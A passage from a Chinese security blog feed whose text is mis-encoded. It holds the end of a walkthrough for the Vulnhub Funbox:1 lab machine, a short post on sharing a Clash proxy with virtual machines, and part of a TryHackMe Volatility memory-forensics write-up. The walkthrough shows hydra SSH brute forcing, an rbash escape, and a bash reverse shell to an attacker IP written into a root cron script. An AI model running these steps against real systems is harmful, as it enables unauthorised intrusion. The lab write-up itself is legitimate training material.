--url http://funbox.fritz.box/<br></code></pre></td></tr></table></figure><ul><li><code>-e vp,vt,u</code>æŒ‡å®šä½¿ç”¨ä¸»é¢˜æ¼æ´æ‰«æ(vt),æ’ä»¶æ¼æ´æ‰«æ(vp)ï¼Œç”¨æˆ·æ‰«æ(u)</li><li><code>--url</code> æŒ‡å®šæ‰«æç›®æ ‡<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/07382fb560a34d0ec3dd9.png"><br>å‘ç°æšä¸¾å‡ºäº†ä¿©ä¸ªç”¨æˆ·ï¼Œå¯ä»¥å»ç™»å½•ç•Œé¢è¯•è¯•å¼±å£ä»¤</p></blockquote></li></ul><h1 id="ğŸšªğŸš¶-è·å–æƒé™-Foothold"><a href="#ğŸšªğŸš¶-è·å–æƒé™-Foothold" class="headerlink" title="ğŸšªğŸš¶ è·å–æƒé™(Foothold)"></a>ğŸšªğŸš¶ è·å–æƒé™(Foothold)</h1><h2 id="ğŸ’²-sshè·å–shell-ssh-get-shell"><a href="#ğŸ’²-sshè·å–shell-ssh-get-shell" class="headerlink" title="ğŸ’² sshè·å–shell(ssh get shell)"></a>ğŸ’² sshè·å–shell(ssh get shell)</h2><p>ç»è¿‡å°è¯•ï¼Œå‘ç°ç”¨æˆ·joeæœ‰å¼±å£ä»¤<em>12345</em>ï¼Œé‚£æˆ‘ä»¬å¯ä»¥è”æƒ³åˆ°æ˜¯å¦ftpå’Œsshä¹Ÿæœ‰å¼±å£ä»¤ï¼Ÿ<br>ç›´æ¥ä¸Šhydra(ä¹å¤´è›‡)çˆ†ç ´è¯•è¯•ï¼Œæ³¨ï¼š<em>åœ¨çœŸå®æ¸—é€æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬åº”è¯¥å°½é‡å‡å°‘æš´åŠ›ç ´è§£çš„æ¬¡æ•°ï¼Œæˆ–è€…åº”å½“åœ¨æ”¶é›†åˆ°äº†è¶³å¤Ÿçš„ä¿¡æ¯å†å»çˆ†ç ´</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l joe -P top1000.txt -v 192.168.61.7 ssh -t 4<br></code></pre></td></tr></table></figure><ul><li><code>-l</code> æŒ‡å®šç”¨æˆ·å</li><li><code>-P</code> æŒ‡å®šå¯†ç å­—å…¸</li><li><code>-v</code> æŒ‡å®šè¯¦ç»†ä¿¡æ¯è¾“å‡ºï¼Œå°†ä¼šè¾“å‡ºçˆ†ç ´è¿›åº¦</li><li><code>ip + æœåŠ¡å</code></li><li><code>-t</code> æŒ‡å®šçº¿ç¨‹ä¸º4ï¼Œåœ¨sshçˆ†ç ´æ—¶ï¼Œåº”ä½¿ç”¨hydraæ¨èçš„çº¿ç¨‹æ•°4<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/094a4eac27394b27b02b9.png"><br>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å¼±å£ä»¤ç›´æ¥sshç™»å½•joeç”¨æˆ·</p></blockquote></li></ul><h2 id="ğŸƒ-rbashé€ƒé€¸-rbash-escape"><a href="#ğŸƒ-rbashé€ƒé€¸-rbash-escape" class="headerlink" title="ğŸƒ rbashé€ƒé€¸(rbash escape)"></a>ğŸƒ rbashé€ƒé€¸(rbash escape)</h2><p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œè·å–çš„æ˜¯ä¸€ä¸ªrbashï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±è¦è¿›è¡Œrbashé€ƒé€¸ã€‚<br>æ³¨ï¼š<em>è¿™é‡Œçš„pspy64æ–‡ä»¶æ˜¯æˆ‘ä¹‹å‰æ‰“é¶çš„æ—¶å€™å°±å·²ç»ä¸‹è½½äº†çš„æ–‡ä»¶</em></p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eedad5d0b0978b28b260a.png"></p></blockquote><p>é€ƒé€¸æ–¹æ³•æœ‰å¾ˆå¤šç§ï¼Œæˆ‘è¿™é‡Œå°±ç”¨pythonæ¥é€ƒé€¸</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å…ˆçœ‹çœ‹mboxæ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿(ä¸€èˆ¬è‡ªå·±å®¶ç›®å½•ä¸‹éƒ½ä¼šæœ‰ç‚¹ä¸œè¥¿æç¤º)</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/56ae90f4639c80ade9244.png"><br>é‡ç‚¹è§£è¯»å°±æ˜¯joeç”¨æˆ·å¸®rootç”¨æˆ·å†™è¿‡ä¸€ä¸ªè„šæœ¬ï¼Œè¿˜æœ‰joeç”¨æˆ·å°†å¯†ç è®¾æˆäº†12345</p></blockquote><h1 id="ğŸ›¡ï¸-æƒé™æå‡-Privilege-Escalation"><a href="#ğŸ›¡ï¸-æƒé™æå‡-Privilege-Escalation" class="headerlink" title="ğŸ›¡ï¸ æƒé™æå‡(Privilege Escalation)"></a>ğŸ›¡ï¸ æƒé™æå‡(Privilege Escalation)</h1><p>ç„¶åæˆ‘ä»¬å°±æ˜¯æ‰¾è¿™ä¸ªè„šæœ¬ï¼Œåç»è¿‡ä¸€ç•ªå¯»æ‰¾ï¼Œæˆ‘ä»¬æœ€ç»ˆåœ¨funnyçš„å®¶ç›®å½•ä¸‹å‘ç°äº†backupè„šæœ¬ï¼Œè¿˜æœ‰ä¸€ä¸ªç½‘ç«™çš„æ‰“åŒ…æ–‡ä»¶</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/13fc337e8d37e471ae16c.png"><br>åˆ°äº†è¿™ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹è¿™ä¸ªå°±æ˜¯joeç”¨æˆ·å†™çš„è„šæœ¬ï¼Œè„šæœ¬é‡Œé¢çš„å†…å®¹æ˜¯å¯¹/var/www/htmlç›®å½•è¿›è¡Œæ‰“åŒ…ã€‚é‚£å°±å¾ˆæ˜æ˜¾äº†ï¼Œå’Œç½‘ç«™å¤‡ä»½ç›¸å…³çš„è®¡åˆ’ä»»åŠ¡ã€‚</p></blockquote><p>ä¸ºäº†éªŒè¯æˆ‘ä»¬çš„çŒœæƒ³ï¼Œæˆ‘ä»¬ç”¨pspyå·¥å…·æ£€æµ‹ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64<br><span class="hljs-built_in">chmod</span> +x pspy64<br>./pspy64 -d /home/funny<br></code></pre></td></tr></table></figure><ul><li><code>-d</code> æŒ‡å®šè¦è§‚å¯Ÿçš„ç›®å½•<br>pspyï¼ˆä¹Ÿç§°ä¸ºâ€pspy64â€ï¼‰æ˜¯ä¸€ä¸ªç”¨äºç›‘è§†è¿›ç¨‹æ´»åŠ¨çš„å·¥å…·ï¼Œç‰¹åˆ«æ˜¯åœ¨Linuxç¯å¢ƒä¸­ã€‚å®ƒå…è®¸ç”¨æˆ·ç›‘è§†æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼ŒæŸ¥çœ‹å®ƒä»¬çš„æ´»åŠ¨å’Œä¸æ–‡ä»¶ç³»ç»Ÿçš„äº¤äº’ï¼Œä»¥åŠä¸å…¶ä»–è¿›ç¨‹çš„é€šä¿¡ã€‚pspyæ˜¯ä¸€ä¸ªè½»é‡çº§çš„å·¥å…·ï¼Œé€šå¸¸è¢«ç”¨äºå®‰å…¨å®¡è®¡å’Œæ•…éšœæ’é™¤ï¼Œä¹Ÿå¯ä»¥ç”¨äºå‘ç°æ½œåœ¨çš„å®‰å…¨é—®é¢˜ã€‚<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b7b6b4af3149bae0c0995.png"><br>æœç„¶ï¼Œæ˜¯å‘ç°æœ‰ä¸€ä¸ªrootçš„è®¡åˆ’ä»»åŠ¡å’Œfunnyçš„è®¡åˆ’ä»»åŠ¡ï¼Œåé¢æ›´æ˜¯å‘ç°ï¼Œrootæ˜¯5åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼Œfunnyç”¨æˆ·æ˜¯2åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡</p></blockquote><h2 id="ğŸ’€-åå¼¹root-shell-reverse-root-shell"><a href="#ğŸ’€-åå¼¹root-shell-reverse-root-shell" class="headerlink" title="ğŸ’€ åå¼¹root shell(reverse root shell)"></a>ğŸ’€ åå¼¹root shell(reverse root shell)</h2>å› ä¸ºæˆ‘ä»¬å¯¹backupæœ‰ä¿®æ”¹æƒé™ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨backupè„šæœ¬ä¸­å†™å…¥åå¼¹shellçš„è¯­å¥<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.61.126/1234 0&gt;&amp;1<br></code></pre></td></tr></table></figure></li><li><code>bash -i</code> è¿™éƒ¨åˆ†å¯åŠ¨Bash shellï¼Œå¹¶ä½¿ç”¨-iæ ‡å¿—è¡¨ç¤ºè¦ä»¥äº¤äº’æ–¹å¼è¿è¡Œï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥æ¥æ”¶ç”¨æˆ·è¾“å…¥å¹¶æ˜¾ç¤ºè¾“å‡º</li></ul><ul><li><code>&gt;&amp; /dev/tcp/192.168.61.126/1234</code> è¿™æ˜¯ä¸€ä¸ªé‡å®šå‘æ“ä½œç¬¦ï¼Œå°†Bashçš„æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯ï¼ˆ1å’Œ2ï¼‰éƒ½é‡å®šå‘åˆ°æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ä¸Šçš„ç½‘ç»œè¿æ¥ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒå°†è¾“å‡ºé‡å®šå‘åˆ°/dev/tcp/192.168.61.126/1234ã€‚ </li><li><code>0&gt;&amp;1</code> è¿™ä¹Ÿæ˜¯ä¸€ä¸ªé‡å®šå‘æ“ä½œç¬¦ï¼Œå°†æ ‡å‡†è¾“å…¥ï¼ˆ0ï¼‰é‡å®šå‘åˆ°ä¸æ ‡å‡†è¾“å‡ºç›¸åŒçš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰é‡å®šå‘åˆ°ç½‘ç»œè¿æ¥çš„ä½ç½®ã€‚</li></ul><p><em>è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯å°†Bash shellçš„è¾“å…¥å’Œè¾“å‡ºè¿æ¥åˆ°IPåœ°å€192.168.61.126ä¸Šçš„ç«¯å£1234ï¼Œè¿™é€šå¸¸ç”¨äºå»ºç«‹ä¸å¦ä¸€å°è®¡ç®—æœºçš„åå‘Shellè¿æ¥ï¼Œä½¿è¿œç¨‹ä¸»æœºå¯ä»¥æ§åˆ¶å’Œæ‰§è¡Œå‘½ä»¤åœ¨è¢«æ”»å‡»çš„ä¸»æœºä¸Š</em><br>è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„bashåå¼¹shellçš„è¯­å¥ï¼Œç„¶åæˆ‘ä»¬åœ¨kaliå¼€å¯ncç›‘å¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lnvp 1234<br></code></pre></td></tr></table></figure><ul><li><code>-l</code>: è¿™æ˜¯netcatçš„ä¸€ä¸ªé€‰é¡¹ï¼Œç”¨äºæŒ‡ç¤ºnetcatè¿›å…¥ç›‘å¬æ¨¡å¼ï¼Œå³ç­‰å¾…ä¼ å…¥è¿æ¥ã€‚</li><li><code>-n</code>: è¿™æ˜¯å¦ä¸€ä¸ªé€‰é¡¹ï¼Œç”¨äºæŒ‡ç¤ºnetcatä¸è¦æ‰§è¡ŒDNSè§£æï¼Œä»¥ä¾¿æ›´å¿«åœ°å¤„ç†è¿æ¥ã€‚</li><li><code>-v</code>: è¿™æ˜¯ä¸€ä¸ªé€‰é¡¹ï¼Œç”¨äºå¯ç”¨è¯¦ç»†çš„è¾“å‡ºï¼Œé€šå¸¸ç”¨äºè°ƒè¯•ç›®çš„ã€‚</li><li><code>-p</code>: æŒ‡å®šnetcatç›‘å¬çš„ç«¯å£å·ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒç›‘å¬ç«¯å£1234ã€‚</li></ul><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/542b7d44ebc8de496e855.png"><br>å¤šæ¬¡ç›‘å¬åä¹Ÿæ˜¯æˆåŠŸæ‹¿åˆ°äº†rootçš„shell</p></blockquote><h1 id="ğŸ‡-å…”å­æ´-rabbit-hole"><a href="#ğŸ‡-å…”å­æ´-rabbit-hole" class="headerlink" title="ğŸ‡ å…”å­æ´(rabbit hole)"></a>ğŸ‡ å…”å­æ´(rabbit hole)</h1><p>ä¸€å¼€å§‹æˆ‘ä»¬åœ¨wpscanæ‰«æå‡ºæ¥çš„å¦å¤–ä¸€ä¸ªç”¨æˆ·ï¼Œadminï¼Œæˆ‘ä»¬æ‹¿åˆ°joeçš„shellåå¯ä»¥å»ç½‘ç«™ç›®å½•ä¸‹çœ‹wpçš„é…ç½®æ–‡ä»¶ï¼Œç„¶åè¿›å…¥æ•°æ®åº“æŸ¥çœ‹ç”¨æˆ·åå’Œå¯†ç </p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/cdabd8ccbe42d5dd99a36.png"></p></blockquote><p>æ¥ç€æˆ‘ä»¬æŠŠè¿™ä¸ªç»™å¤åˆ¶å‡ºæ¥ï¼Œç”¨johnå»çˆ†ç ´è¿™ä¸ªhashå€¼</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4bd2db2cd64b31a2b16c6.png"></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><ul><li><code>pass.txt</code> å°†è¦ç ´è§£çš„hashå€¼å†™å…¥ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶</li><li><code>--wordlist=</code> æŒ‡å®šå¯†ç å­—å…¸ä¸ºkaliå…±äº«ç›®å½•ä¸‹çš„rockyouå­—å…¸<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/820ac9f18fdb94c6a0373.png"></p></blockquote></li></ul><p>çˆ†ç ´å‡ºæ¥åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯<code>iubire</code>ï¼Œæ‹¿å»ç™»å½•çœ‹çœ‹</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/90b8aaa87687692b46389.png"></p></blockquote><p>æˆåŠŸç™»å½•åæˆ‘ä»¬å¯ä»¥è¯•ç€çœ‹èƒ½ä¸èƒ½ç”¨wpçš„æ¼æ´å»getshellï¼Œä½†æ˜¯å¾ˆæ˜¾ç„¶åœ¨è¿™é‡Œåº”è¯¥æ˜¯æ‹¿ä¸åˆ°rootæƒé™çš„ï¼Œæœ€å¤šæ‹¿ä¸€ä¸ªæ™®é€šshellï¼Œæˆ–è€…è¯´æ™®é€šshelléƒ½æ‹¿ä¸åˆ°<br>å…·ä½“å’‹æ ·è¿˜æœ‰å¾…åç»­çš„å°è¯•<br><em>å¾…ç»­</em></p><h1 id="ğŸ“–-æ¨èæ–‡ç« "><a href="#ğŸ“–-æ¨èæ–‡ç« " class="headerlink" title="ğŸ“– æ¨èæ–‡ç« "></a>ğŸ“– æ¨èæ–‡ç« </h1><p>å›½å¤–å¤§ä½¬å…³äºfunbox:1çš„wp:<a href="https://tiagotavares.io/2020/08/funbox-1-vulnhub/#-foothold">funbox:1</a><br>rbashé€ƒé€¸çš„æ–¹æ³•:<a href="https://xz.aliyun.com/t/7642">rbashé€ƒé€¸</a><br>funbox:1é¶æœºä¸‹è½½åœ°å€:<a href="https://www.vulnhub.com/entry/funbox-1,518/">ä¸‹è½½</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linuxä½¿ç”¨clashç®€ä¾¿æ–¹æ³•</title>
    <link href="/Linux%E4%BD%BF%E7%94%A8clash%E7%AE%80%E4%BE%BF%E6%96%B9%E6%B3%95/"/>
    <url>/Linux%E4%BD%BF%E7%94%A8clash%E7%AE%80%E4%BE%BF%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="å¦‚ä½•è¶…çº§ç®€å•çš„ä½¿ç”¨é­”æ³•ï¼Œåœ¨ä½ çš„è™šæ‹Ÿæœºä¸­ï¼Ÿ"><a href="#å¦‚ä½•è¶…çº§ç®€å•çš„ä½¿ç”¨é­”æ³•ï¼Œåœ¨ä½ çš„è™šæ‹Ÿæœºä¸­ï¼Ÿ" class="headerlink" title="å¦‚ä½•è¶…çº§ç®€å•çš„ä½¿ç”¨é­”æ³•ï¼Œåœ¨ä½ çš„è™šæ‹Ÿæœºä¸­ï¼Ÿ"></a>å¦‚ä½•è¶…çº§ç®€å•çš„ä½¿ç”¨é­”æ³•ï¼Œåœ¨ä½ çš„è™šæ‹Ÿæœºä¸­ï¼Ÿ</h2><p>å¹³æ—¶åœ¨è™šæ‹Ÿæœºä¸­æ€»ä¼šé‡åˆ°ç”¨é­”æ³•çš„æ—¶å€™ï¼Œä½†æ˜¯æœ‰è¿™ä¹ˆå‡ ä¸ªé—®é¢˜ï¼Ÿ</p><ul><li>linux ä¸åŒäº windowsï¼Œæ“ä½œå®‰è£…éƒ½ç®€å•ï¼ˆå¤§ä½¬ç•¥è¿‡ï¼‰ï¼Œæˆ‘ä»¬åœ¨ linux ä¸Šå®‰è£… v2ray æˆ–è€… clash éƒ½ä¼šå¯èƒ½æ—¶ä¸æ—¶é‡åˆ°æŠ¥é”™ï¼Œåˆæˆ–è€…é…ç½®é”™è¯¯</li><li>å¯èƒ½ä¼šæœ‰å¾ˆå¤šå¤ªè™šæ‹Ÿæœºï¼Œæ¯å°è™šæ‹Ÿæœºéƒ½é…ç½®ä¸€ä¸‹å²‚ä¸æ˜¯å¾ˆçƒ¦ï¼Ÿ</li><li>æœ‰çš„é­”æ³•ä¼šé™åˆ¶è®¾å¤‡æ•°ï¼Œè™šæ‹Ÿæœºå’Œæœ¬æœºæ˜¯ç®—ä¸€ä¸ªè¿˜æ˜¯å¤šä¸ªï¼ˆè¿™ä¸ªæˆ‘ä¸çŸ¥é“ï¼Œå­˜ç–‘ï¼‰</li></ul><p>è¯¸å¦‚ä»¥ä¸Šçš„é—®é¢˜ï¼Œé‚£è¦å¦‚ä½•æ–¹ä¾¿çš„ä½¿ç”¨é­”æ³•ï¼Œåªéœ€ä¿©æ­¥ï¼š</p><h4 id="ç¬¬ä¸€æ­¥"><a href="#ç¬¬ä¸€æ­¥" class="headerlink" title="ç¬¬ä¸€æ­¥"></a>ç¬¬ä¸€æ­¥</h4><p>åœ¨ windows çš„ clash å®¢æˆ·ç«¯ä¸­å¼€å¯ Allow Lan é€‰é¡¹ï¼Œå¦‚å›¾</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/bd6da1cfa43536515211b.png"><br>æ­¤æ—¶è®°ä½æˆ‘ä»¬çš„ç«¯å£å·</p></blockquote><h4 id="ç¬¬äºŒæ­¥"><a href="#ç¬¬äºŒæ­¥" class="headerlink" title="ç¬¬äºŒæ­¥"></a>ç¬¬äºŒæ­¥</h4><p>æ‰“å¼€æˆ‘ä»¬çš„è™šæ‹Ÿæœºçš„è®¾ç½®ï¼ŒæŒ‰ä»¥ä¸‹æ­¥éª¤è®¾ç½®</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f04002b20e7398c81cd1f.png"></p></blockquote><h4 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h4><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/2a6c3590350c838c1c0a3.png"></p></blockquote><p>æ­¤æ—¶æˆ‘ä»¬åœ¨ç»ˆç«¯å’Œæµè§ˆå™¨ä¸­éƒ½å¯ä»¥è®¿é—®å¤–ç½‘äº†<br>è¿™æ ·æˆ‘ä»¬ git ä¹Ÿå¿«å¾ˆå¤šï¼Œä¹Ÿä¸å¿…æ¢æºäº†ã€‚<br>v2ray çš„è¯æ²¡æœ‰å»è¯•è¿‡ï¼Œå› ä¸ºä¹‹å‰ v2ray çš„è®¢é˜…è¿‡æœŸäº†ï¼Œä½†æ˜¯ v2ray é‡Œæœ‰ä¸ªç›¸åŒçš„è®¾ç½®ï¼ŒæŒ‰é“ç†åº”è¯¥ä¹Ÿå¯ä»¥</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/05b311eecc4013f3b4d68.png"></p></blockquote><h4 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h4><ul><li>ä¸€èˆ¬ç‰©ç†æœº ip åˆ†é…çš„ä¸ä¼šå˜ï¼Œä½†æ˜¯å¦‚æœè™šæ‹Ÿæœºä¸èƒ½æ–½å±•é­”æ³•äº†ï¼Œè¯·æŸ¥çœ‹ç‰©ç†æœº ip æ˜¯å¦æ”¹å˜</li><li>è™šæ‹Ÿæœºå’Œç‰©ç†æœºè¦åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘ä¸­ï¼Œå»ºè®®ä½¿ç”¨è™šæ‹Ÿæœºä¸­çš„æ¡¥æ¥æ¨¡å¼ï¼Œç„¶ååœ¨ç½‘ç»œè®¾ç½®ä¸­é€‰æ‹©å’Œç‰©ç†æœºåŒä¸€å¼ ç½‘å¡</li></ul><h4 id="é¢˜å¤–è¯"><a href="#é¢˜å¤–è¯" class="headerlink" title="é¢˜å¤–è¯"></a>é¢˜å¤–è¯</h4><p>æˆ‘ä¹‹å‰æ˜¯ç”¨çš„ ubuntu23 ç‰ˆæœ¬ï¼Œç„¶ååœ¨ç½‘ä¸Šæ¢äº†ä¸ªé˜¿é‡Œäº‘çš„æºï¼Œåé¢ä¸‹è½½ ssh æœåŠ¡å’Œå…¶ä»–ä¸œè¥¿çš„çš„æ—¶å€™ä¸€ç›´æŠ¥é”™å®‰è£…ä¸äº†</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/21e0106f6e08af927e5f7.png"></p></blockquote><p>å½“æ—¶ä¸€ç›´é—® gptï¼Œç„¶åæ²¡è§£å†³ï¼Œåé¢ç™¾åº¦äº†â€ g++ : ä¾èµ–: cpp (= 4:9.3.0-1ubuntu2) ä½†æ˜¯ 4:12.2.0-3ubuntu1 æ­£è¦è¢«å®‰è£…â€æ‰çŸ¥é“æ˜¯å› ä¸ºæºçš„é—®é¢˜ï¼Œç„¶åæˆ‘åˆæ¢å›åŸæ¥çš„æº</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>clash</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>clash</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tryhackmeæˆ¿é—´volatility å–è¯</title>
    <link href="/tryhackme%E6%88%BF%E9%97%B4volatility%20%E5%8F%96%E8%AF%81/"/>
    <url>/tryhackme%E6%88%BF%E9%97%B4volatility%20%E5%8F%96%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h1 id="é¢˜ç›®-1"><a href="#é¢˜ç›®-1" class="headerlink" title="é¢˜ç›® 1"></a>é¢˜ç›® 1</h1><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d981f70b0a96644b8e338.png"><br>å·²çŸ¥ä¿¡æ¯ï¼šç”± abode æ–‡æ¡£æ„ŸæŸ“è€Œæ¥,è¿˜æœ‰ä¸€ä¸ª ip</p><ul><li>ç¬¬ä¸€é—®å’Œç¬¬äºŒé—®<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9d6cec469ce44083152b8.png"><br>å°±æ˜¯æ±‚ä¸»æœºä¿¡æ¯ï¼Œæ ¹æ®å‰é¢çš„æ•™ç¨‹ï¼Œæˆ‘ä»¬ç”¨ windows.info æ’ä»¶å°±å¯ä»¥</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem windows.info<br></code></pre></td></tr></table></figure><blockquote><p>æ­¤å¤„-f æŒ‡å®šé•œåƒå†…å­˜æ–‡ä»¶</p></blockquote><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6f88bf187bdfe43fc9e5f.png"></p></blockquote><ul><li>ç¬¬ä¸‰é—® <u><br>What process can be considered suspicious in Case 001?</u><br>å“ªä¸ªæ˜¯å¯ç–‘è¿›ç¨‹ï¼Œç”¨ windows.pslist æ±‚å‡ºè¿›ç¨‹åˆ—è¡¨å°±è¡Œï¼Œå¦‚æœæ²¡å‘ç°ï¼Œå°±ç”¨ windows.psscanï¼Œå¯ä»¥çœ‹éšè—çš„è¿›ç¨‹</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem windows.pslist<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/8247d4d481636428691fb.png"><br>æ ¹æ®ä¹‹å‰ç»™çš„æç¤ºï¼Œå°±æ˜¯è¿™ä¸ª reader_sl.exe è¿›ç¨‹ï¼ŒæŠŠè¿™ä¸ªçš„ä¿¡æ¯äº¤ä¸Šå»å³å¯</p></blockquote><ul><li>ç¬¬ 456 é—®<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f6c9f21cc546bbae1434c.png"><br>å°±æ˜¯æ±‚çˆ¶è¿›ç¨‹ä¿¡æ¯ï¼Œå¯ç–‘è¿›ç¨‹ pidï¼Œçˆ¶è¿›ç¨‹ pidï¼Œæˆ‘ä»¬ç”¨ windows.pstree</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem windows.pstree<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1c317d503bcf162f98fb3.png"></p></blockquote><ul><li>ç¬¬ä¸ƒå…«é—®<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/0b839dc4d4b38ec6bdd8c.png"><br>æ±‚ user-agent ä»¥åŠä¸€ä¸ªé“¶è¡Œä¹Ÿæ²¡æœ‰å…³ç³»ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦æŸ¥ä¸€ä¸ªå…·ä½“çš„è¿›ç¨‹å†…å®¹äº†<br>è¿™ä¸ªæ—¶å€™ï¼Œå¯ä»¥ç”¨ windows.memmap.Memmap æ’ä»¶çœ‹å†…å­˜ä¿¡æ¯ï¼Œç„¶åâ€“dump ç»™ä¿å­˜ä¸‹æ¥</p></blockquote></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem -o /tmp/ windows.memmap.Memmap --pid 1640 --dump<br></code></pre></td></tr></table></figure><blockquote><p>-o æŒ‡å®šè¾“å‡ºè·¯å¾„ï¼Œâ€“pid æŒ‡å®šè¿›ç¨‹ pidï¼Œâ€“dump ä¿å­˜è¿›ç¨‹ä¿¡æ¯<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/19fd7393ac32f675d98a3.png"><br>è¿™æ˜¯æ­£å¸¸çš„è¾“å‡º<br>ç„¶åç”¨ strings å‘½ä»¤æ‰“å°è¾“å‡º</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings /tmp/*.dmp | grep -i user-agent<br></code></pre></td></tr></table></figure><blockquote><p>grep -i å¿½ç•¥å¤§å°å†™<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/30ca5f8ebcb96c431b47e.png"></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings /tmp/*.dmp | grep -i chase<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/663d31ed91db660eb3c19.png"><br>çœ‹åˆ°è¾“å‡ºäº†å’Œ chase æœ‰å…³çš„ç½‘ç«™ï¼Œé‚£å°±æ˜¯æœ‰å…³äº†</p></blockquote><h1 id="é¢˜ç›®-2"><a href="#é¢˜ç›®-2" class="headerlink" title="é¢˜ç›® 2"></a>é¢˜ç›® 